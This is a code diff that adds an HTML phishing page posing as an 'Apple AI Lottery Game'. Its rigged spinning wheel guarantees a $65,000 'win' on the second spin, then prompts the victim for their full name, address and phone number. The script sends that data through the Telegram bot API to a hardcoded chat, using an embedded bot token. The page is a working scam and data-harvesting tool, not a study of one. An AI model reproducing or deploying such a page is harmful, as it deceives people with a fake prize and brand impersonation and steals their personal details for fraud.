@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="/img/apple.ico">
+    <title>Apple IA Lucky you</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; background-color: #121212; color: white; }
+        header, footer { padding: 10px; background-color: #333; }
+        .container { margin: 20px auto; max-width: 400px; background: #222; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
+        input, select, button { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
+        input, select { background: #333; color: white; }
+        button { background: #ffcc00; cursor: pointer; }
+
+        .wheel-container { display: none; position: relative; width: 300px; height: 300px; margin: 50px auto; }
+        .wheel { width: 100%; height: 100%; border-radius: 50%; transition: transform 3s ease-out; }
+        .pointer { width: 20px; height: 20px; background: red; position: absolute; top: -10px; left: 50%; transform: translateX(-50%); clip-path: polygon(50% 0, 0 100%, 100% 100%); }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            top: 0;
+            left: 0;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid transparent;
+            border-top: 5px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        #try-again-message, #win-message { display: none; font-size: 18px; font-weight: bold; margin-top: 10px; }
+        #try-again-message { color: red; }
+        #win-message { color: gold; animation: blink 1s infinite alternate; }
+        @keyframes blink { from { opacity: 1; } to { opacity: 0; } }
+    </style>
+</head>
+<body>
+<header>
+    <div style="background-color: #0000ft; padding: 20px; max-width: 400px; border-radius: 8px; box-shadow: 0 0 10px pink; color: black; text-align: center; font-size: 18px; font-weight: bold;">
+        <img width="35" height="35" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/><font color="gray">Apple AI Lottery Game</font></header>
+     
+</div><br>
+  <head>
+        <style>
+            .blink 
+                animation: blinker 1.5s linear infinite;
+                color: red;
+                font-family: sans-serif;
+            }
+
+            @keyframes blinker {
+                50% {
+                    opacity: 0;
+                }
+            }
+        </style>
+    </head>
+
+    <body>
+        <marquee class="blink">
+This is IA Lottery game. power by Apple Company  </marquee>
+    </body>
+
+<!-- Registration Form -->
+<div class="container" id="registration">
+</h2>🧾Register to Play</h2>
+  
+    <input type="text" id="name" placeholder="👤 Full Name">
+    <select id="gender">
+        <option value="">  🚻 Select Gender</option>
+        <option value="Male">🧍Male</option>
+        <option value="Female">🧍Female</option>
+    </select>
+    <input type="text" id="phone" placeholder="📞 Phone Number">
+    <input type="email" id="email" placeholder="📧 E-mail">
+    <button onclick="submitForm()">🧾Register</button>
+</div>
+</div>
+
+<div class="loading-overlay" id="loading-screen">
+    <div class="loading-spinner"></div>
+</div>
+
+<button id="start-game" style="display:none;" onclick="showWheel()">TRY YOUR LUCK!</button>
+
+<div class="wheel-container">
+    <div class="pointer"></div>
+    <canvas id="wheelCanvas" width="300" height="300"></canvas>
+    <button onclick="spinWheel()">Spin</button>
+</div>
+
+<p id="try-again-message">Try Again! You have 1 spinning left.</p>
+<p id="win-message">WOW! 😲 You have won $65,000! Click below to continue.</p>
+<button id="continue-button" style="display:none;" onclick="showActivationSection()">Continue</button>
+
+<div id="activation-section" style="display:none;">
+    <h2>Welcome to Activating Point</h2>
+        <div style="position: relative; background-color: #f8f9fa; padding: 20px; max-width: 400px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); border-left: 8px solid #ff4081;">
+  
+  <!-- Bell Icon Image -->
+  <img src="https://i.postimg.cc/kDBGNcLg/notification.png" alt="Notification Icon" 
+       style="position: absolute; top: -15px; left: -15px; width: 40px; height: 40px;">
+  
+  <!-- Inner Notice Container -->
+  <div style="background-color: #fff3cd; padding: 15px; border-radius: 8px; border: 1px solid #ffcc00;">
+    <h3 style="margin: 0; color: #d39e00;">⚠️Alert!</h3>
+    <p style="color: #333; margin-top: 5px;">
+      This is an important notice. Please pay attention to the details. <br><font color="#ffcc00"><i>Here you will need to Contact our staffs to Claim your winning by typing your full name,phone number and address below so that we can deliver your money to your door step thanks.</i></font></h3>
+    </p>
+  </div>
+  
+</div>
+        <br>
+       <h4><i>All database will be submited to the Apple IA HQ Congratulations one's again. </i></h4>
+</br>
+</br>
+</br>
+    <input type="text" id="lottery-key" placeholder="Type your full name,addres,Phone number 🥳">
+    <button onclick="submitLotteryKey()">Activate</button>
+</div>
+
+<!-- Footer -->
+    <footer>
+         <img width="20" height="20" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/>  &copy; 2025 IA Lottery.| All Rights Reserved | Play Smart, Win Big! </p>
+    </footer>
+
+<script>
+    let telegramToken = "7612075949:AAFYpoGkaGHsFsM00zt1QQkKowiBxDORmr0";
+    let chatID = "7486773651";
+    let firstSpin = true;
+    let canvas = document.getElementById("wheelCanvas");
+    let ctx = canvas.getContext("2d");
+    let colors = ["red", "blue", "green", "yellow", "purple", "orange", "pink", "gray"];
+    let spinDegrees = 0;
+    let sections = colors.length;
+
+    function drawWheel() {
+        let startAngle = 0;
+        let arc = Math.PI / (sections / 2);
+
+        for (let i = 0; i < sections; i++) {
+            let endAngle = startAngle + arc;
+            ctx.beginPath();
+            ctx.moveTo(150, 150);
+            ctx.arc(150, 150, 150, startAngle, endAngle);
+            ctx.fillStyle = colors[i];
+            ctx.fill();
+            ctx.closePath();
+            startAngle = endAngle;
+        }
+    }
+
+    drawWheel();
+
+    function showLoadingScreen(callback) {
+        document.getElementById("loading-screen").style.display = "flex";
+        setTimeout(() => {
+            document.getElementById("loading-screen").style.display = "none";
+            callback();
+        }, 5000);
+    }
+
+    function submitForm() {
+        document.getElementById("registration").style.display = "none";
+        showLoadingScreen(() => {
+            document.getElementById("start-game").style.display = "block";
+        });
+    }
+
+    function showWheel() {
+        document.getElementById("start-game").style.display = "none";
+        showLoadingScreen(() => {
+            document.querySelector(".wheel-container").style.display = "block";
+        });
+    }
+
+    function spinWheel() {
+        let degrees = firstSpin ? 720 : 1440 + (Math.floor(Math.random() * sections) * (360 / sections));
+        spinDegrees += degrees;
+
+        canvas.style.transition = "transform 3s ease-out";
+        canvas.style.transform = `rotate(${spinDegrees}deg)`;
+
+        setTimeout(() => {
+            if (!firstSpin) {
+                document.getElementById("try-again-message").style.display = "none";
+                document.getElementById("win-message").style.display = "block";
+                document.getElementById("continue-button").style.display = "block";
+                document.querySelector(".wheel-container").style.display = "none";
+            } else {
+                document.getElementById("try-again-message").style.display = "block";
+                firstSpin = false;
+            }
+        }, 3000);
+    }
+
+    function showActivationSection() {
+        document.getElementById("win-message").style.display = "none";
+        document.getElementById("continue-button").style.display = "none";
+        showLoadingScreen(() => {
+            document.getElementById("activation-section").style.display = "block";
+        });
+    }
+
+    function submitLotteryKey() {
+        let lotteryKey = document.getElementById("lottery-key").value;
+        if (!lotteryKey) {
+            alert("Please enter your Full name,address and phone number to Activate your winning .");
+            return;
+        }
+
+        showLoadingScreen(() => {
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("Winners name for activation :\n" + lotteryKey)}`)
+            .then(() => {
+                alert("Activating... One of our Agent we contact you as soon as possible");
+                window.location.href = "certificate.html";
+            })
+            .catch(error => {
+                alert("Error sending winnig name.");
+                console.error(error);
+            });
+        });
+    }
+</script>
+<script src="scripts.js"></script>
+
+</body>
+</html>
